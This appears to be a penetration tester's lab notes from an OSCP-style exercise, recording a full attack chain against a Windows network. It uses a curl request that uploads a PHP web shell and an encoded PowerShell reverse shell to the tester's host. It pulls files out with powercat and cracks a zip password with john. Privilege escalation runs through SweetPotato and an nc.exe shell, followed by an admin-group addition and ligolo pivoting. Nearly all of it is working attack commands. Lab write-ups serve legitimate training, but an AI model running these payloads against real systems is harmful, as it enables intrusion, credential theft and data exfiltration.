

## Steps taken:

```bash

# Enumeration

# nmap
21/tcp    open  ftp           Microsoft ftpd
80/tcp    open  http          Apache httpd 2.4.54 ((Win64) PHP/8.0.26 mod_fcgid/2.3.10-dev)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49669/tcp open  msrpc         Microsoft Windows RPC

# Port 80
Free HTML editor
nicepage 5.5.0
apache 2.4.54

# login page @ 
http://192.168.144.101/webaccess/

# Used exploit
https://packetstormsecurity.com/files/175075/Clinics-Patient-Management-System-1.0-Shell-Upload.html

# Send curl
curl -i -s -k -X $'POST' \
    -H $'Host: 192.168.144.101' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Content-Type: multipart/form-data; boundary=---------------------------11668063818537881393672984185' -H $'Origin: http://192.168.49.144' -H $'Connection: close' -H $'Referer: http://192.168.144.101/webaccess/users.php' -H $'Upgrade-Insecure-Requests: 1' -H $'Content-Length: 787' \
    --data-binary $'-----------------------------11668063818537881393672984185\x0d\x0aContent-Disposition: form-data; name=\"display_name\"\x0d\x0a\x0d\x0aCannn3\x0d\x0a-----------------------------11668063818537881393672984185\x0d\x0aContent-Disposition: form-data; name=\"user_name\"\x0d\x0a\x0d\x0aGull3\x0d\x0a-----------------------------11668063818537881393672984185\x0d\x0aContent-Disposition: form-data; name=\"password\"\x0d\x0a\x0d\x0acangul\x0d\x0a-----------------------------11668063818537881393672984185\x0d\x0aContent-Disposition: form-data; name=\"profile_picture\"; filename=\"phps.php\"\x0d\x0aContent-Type: application/x-php\x0d\x0a\x0d\x0a<?php\x0a    if(isset($_GET[\'cmd\']))\x0a    {\x0a        system($_GET[\'cmd\']);\x0a    }\x0a?>\x0a\x0d\x0a-----------------------------11668063818537881393672984185\x0d\x0aContent-Disposition: form-data; name=\"save_user\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11668063818537881393672984185--\x0d\x0a' \
    $'http://192.168.144.101/webaccess/users.php'
	

	
# Visit the php web shell
http://192.168.144.101/webaccess/user_images/
http://192.168.144.101/webaccess/user_images/1718803825phps.php?cmd=whoami

# Create a rev shell
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQAOQAuADEANAA0ACIALAAxADIAMwA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==

# nc listener
sudo rlwrap nc -nvlp 1234

# Send payload
/webaccess/user_images/1718803825phps.php?cmd=powershell+-e+JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQAOQAuADEANAA0ACIALAAxADIAMwA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA%3d%3d

# whoami
whoami
	ms01\a.hansen
	

# Found files in
C:\users\a.hansen\documents
	-a----         3/1/2023   3:18 AM           2490 backup.zip                                                            
	-a----         3/1/2023   3:17 AM           7600 old-site.zip                                                          
	-a----         5/7/2024  10:39 AM           3599 sys.zip

# Transfer files to kali
iwr 192.168.49.144/tools/powercat.ps1 -outfile powercat.ps1
powershell -ep bypass
import-module .\powercat.ps1

	PS C:\users\a.hansen> powercat -c 192.168.49.144 -p 4444 -i C:\users\a.hansen\Documents\backup.zip
	PS C:\users\a.hansen> powercat -c 192.168.49.144 -p 4444 -i C:\users\a.hansen\Documents\old-site.zip
	PS C:\users\a.hansen> powercat -c 192.168.49.144 -p 4444 -i C:\users\a.hansen\Documents\sys.zip
	
nc -nvlp 4444 > sys.zip

# sys.zip is password protected, crack it
zip2john sys.zip > sys.hash
john --wordlist=/usr/share/wordlists/rockyou.txt sys.hash
sys.zip:hospital6575

# Add to info/password

# unzip sys.zip
unzip sys.zip
	hospital6575
	
# cat web.config
cat web.config
    <add key="ApiUserName" value="rudi.davis" />
    <add key="ApiPassword" value="SysAdmin4Life!" />
	
# Add to info/

# Add users under C:\users\ to info/
	rudi.davis
	a.hansen
	Administrator
	Lance.Rubens
	svc_service
	
# Check privs of user
whoami /all
	SeImpersonatePrivilege
	
# Run potato
iwr 192.168.49.144/tools/sweetpotato.exe -outfile sweetpotato.exe
iwr 192.168.49.144/tools/nc.exe -outfile nc.exe

sudo rlwrap nc -nvlp 1122
.\sweetpotato.exe -a "C:\users\a.hansen\nc.exe -t -e C:\windows\system32\cmd.exe 192.168.49.144 1122"

# proof.txt
PS C:\Users\Administrator\desktop> cat proof.txt
cat proof.txt

# Setup ligolo
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:443

iwr 192.168.49.144:80/tools/agent.exe -outfile agent.exe
.\agent.exe -connect 192.168.49.144:443 -ignore-cert

ligolo> session
ligolo> start
sudo ip route add 172.16.144.0/24 dev ligolo

# Try to ping internal host
ping 172.16.144.102
	64 bytes from 172.16.144.102: icmp_seq=1 ttl=64 time=119 ms
	
# nmap scan on internal ms01
sudo nmap -p- -sS -sV -sC -Pn -v --open -oN nmap/ms01.internal 172.16.144.101
	21/tcp    open  ftp           Microsoft ftpd
	80/tcp    open  http          Apache httpd 2.4.54 ((Win64) PHP/8.0.26 mod_fcgid/2.3.10-dev)
	135/tcp   open  msrpc         Microsoft Windows RPC
	139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
	445/tcp   open  microsoft-ds?
	3306/tcp  open  mysql         MySQL (unauthorized)
	3307/tcp  open  mysql         MariaDB (unauthorized)
	3389/tcp  open  ms-wbt-server Microsoft Terminal Services
	5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	49664/tcp open  msrpc         Microsoft Windows RPC
	49665/tcp open  msrpc         Microsoft Windows RPC
	49666/tcp open  msrpc         Microsoft Windows RPC
	49667/tcp open  msrpc         Microsoft Windows RPC
	49668/tcp open  msrpc         Microsoft Windows RPC
	49669/tcp open  msrpc         Microsoft Windows RPC
	49670/tcp open  msrpc         Microsoft Windows RPC
	49671/tcp open  msrpc         Microsoft Windows RPC
	
# nmap scan on ms02
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	
# nmap scan on dc
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-09-13 09:09:55Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: oscp.exam0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: oscp.exam0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49686/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  msrpc         Microsoft Windows RPC
49714/tcp open  msrpc         Microsoft Windows RPC
	
# Add rudi.davis to local admin group so we can RDP
net localgroup administrators rudi.davis /add

xfreerdp /dynamic-resolution +clipboard /drive:data,/tmp /cert:ignore /v:172.16.144.101 /u:rudi.davis /p:'SysAdmin4Life!'

# Try DCOM

# winpeas
	MS01\a.hansen: MS01 Company Site Administrator
        |->Groups: Remote Management Users
		
	Fastdump - 2.3.0.97 [CounterTack]: C:\Windows\system32\fastdumpx64.sys
	
	T%P%P%P%P%P%P%P%P%P%P%c% Looking for common SAM & SYSTEM backups
    C:\Windows\System32\config\RegBack\SAM
    File Permissions: Administrators [AllAccess]

    C:\Windows\System32\config\RegBack\SYSTEM
    File Permissions: Administrators [AllAccess]
	
# Completly lost of ideas...




```


## Screens

- Initial access ms01

![edb49abbcff187fe376adf499bae694b.png](../../../_resources/edb49abbcff187fe376adf499bae694b.png)
![a69e25663fdc9b8a5d87dbffd245efde.png](../../../_resources/a69e25663fdc9b8a5d87dbffd245efde.png)
![781b8beda5b748dc1faeaa775a44a029.png](../../../_resources/781b8beda5b748dc1faeaa775a44a029.png)
![975701118becedb95097336060a0ab06.png](../../../_resources/975701118becedb95097336060a0ab06.png)
![6775466103d21bbd4f7b94eee6053440.png](../../../_resources/6775466103d21bbd4f7b94eee6053440.png)

#


- local.txt & proof.txt.ms01

![ac28cba47f3c02aa000b6fadcdda6836.png](../../../_resources/ac28cba47f3c02aa000b6fadcdda6836.png)
![1c1252ed42a21cac09db0882d416de0e.png](../../../_resources/1c1252ed42a21cac09db0882d416de0e.png)

#

- ligolo setup

![a5efaa63dbaa689b0d38c86291763141.png](../../../_resources/a5efaa63dbaa689b0d38c86291763141.png)